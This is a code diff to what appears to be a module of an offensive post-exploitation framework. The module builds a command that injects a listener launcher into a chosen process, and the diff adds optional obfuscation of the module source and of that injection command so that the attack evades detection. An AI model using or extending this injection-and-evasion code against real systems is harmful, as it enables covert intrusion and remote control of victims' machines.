@@ -83,7 +83,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         listenerName = self.options['Listener']['Value']
         procID = self.options['ProcId']['Value'].strip()
@@ -100,7 +100,9 @@ class Module:
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-PSInject.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -111,7 +113,7 @@ class Module:
         f.close()
 
         script = moduleCode
-
+        scriptEnd = ""
         if not self.mainMenu.listeners.is_listener_valid(listenerName):
             # not a valid listener, return nothing for the script
             print helpers.color("[!] Invalid listener: %s" %(listenerName))
@@ -127,8 +129,10 @@ class Module:
                 launcherCode = launcher.split(' ')[-1]
 
                 if procID != '':
-                    script += "Invoke-PSInject -ProcID %s -PoshCode %s" % (procID, launcherCode)
+                    scriptEnd += "Invoke-PSInject -ProcID %s -PoshCode %s" % (procID, launcherCode)
                 else:
-                    script += "Invoke-PSInject -ProcName %s -PoshCode %s" % (procName, launcherCode)
-
+                    scriptEnd += "Invoke-PSInject -ProcName %s -PoshCode %s" % (procName, launcherCode)
+                if obfuscate:
+                    scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+                script += scriptEnd
                 return script
